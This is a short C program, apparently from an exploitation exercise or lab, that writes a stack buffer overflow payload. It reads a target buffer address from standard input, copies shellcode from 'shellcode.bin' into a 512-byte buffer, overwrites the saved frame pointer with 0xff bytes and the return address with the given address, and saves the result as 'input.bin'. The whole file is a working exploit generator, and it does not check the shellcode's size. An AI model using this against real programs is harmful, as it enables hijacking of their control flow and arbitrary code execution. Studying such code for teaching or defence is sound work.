#include <stdio.h>
#include <string.h>

const int BUFFER_SIZE = 512;
const char *FILE_SHELLCODE = "shellcode.bin";
const char *FILE_INPUT = "input.bin";

int main() {
	unsigned long buffer_pointer;
	scanf("%lu", &buffer_pointer);

	FILE *f = fopen(FILE_SHELLCODE, "rb");

	char buffer[BUFFER_SIZE + 8 * 2]; // buffer + sfp + ret
	memset(buffer, 0xff, sizeof(buffer)); // sfp will be written with 0xffffffffffffffff

	// Get shellcode size
	fseek(f, 0, SEEK_END);
	int size = ftell(f);
	rewind(f);
	fread(buffer, size, 1, f);

	char *ret = buffer + BUFFER_SIZE + 8; // ret = buffer + sizeof(buffer) + sizeof(sfp)
	*(unsigned long *)ret = buffer_pointer;

	fclose(f);

	f = fopen(FILE_INPUT, "wb");
	fwrite(buffer, sizeof(buffer), 1, f);
	fclose(f);
}
